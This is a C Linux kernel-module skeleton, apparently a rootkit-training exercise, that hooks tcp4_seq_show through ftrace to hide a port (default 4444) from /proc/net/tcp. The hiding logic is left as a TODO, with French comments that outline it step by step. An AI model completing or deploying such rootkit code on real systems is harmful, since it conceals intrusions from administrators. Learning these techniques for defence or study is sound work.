#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/seq_file.h>
#include <linux/inet.h>
#include <net/inet_sock.h>
#include <net/sock.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("rootkitlings");
MODULE_DESCRIPTION("032: hide a port from /proc/net/tcp");

static int target_port = 4444;
module_param(target_port, int, 0644);
MODULE_PARM_DESC(target_port, "Port to hide from /proc/net/tcp");

static asmlinkage int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage int hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    // TODO(rootkitlings):
    //   1. Si v == SEQ_START_TOKEN, appelle l'original (c'est le header).
    //   2. Sinon, cast v en struct sock*: struct sock *sk = v;
    //   3. Lis le port local: int port = inet_sk(sk)->inet_num;
    //   4. Si port == target_port, retourne 0 (skip cette ligne).
    //   5. Sinon, appelle et retourne orig_tcp4_seq_show(seq, v).
    //
    //   ~8 lignes.

    return orig_tcp4_seq_show(seq, v);
}

static struct fthelper_hook hook = {
    .name = "tcp4_seq_show",
    .hook_fn = hook_tcp4_seq_show,
    .orig_fn = &orig_tcp4_seq_show,
};

static int __init hideport_init(void)
{
    int ret;

    pr_info("rootkitlings/032: installing tcp4_seq_show hook, hiding port %d\n",
            target_port);
    ret = fthelper_install(&hook);
    if (ret)
        return ret;

    return 0;
}

static void __exit hideport_exit(void)
{
    fthelper_remove(&hook);
    pr_info("rootkitlings/032: hook removed\n");
}

module_init(hideport_init);
module_exit(hideport_exit);
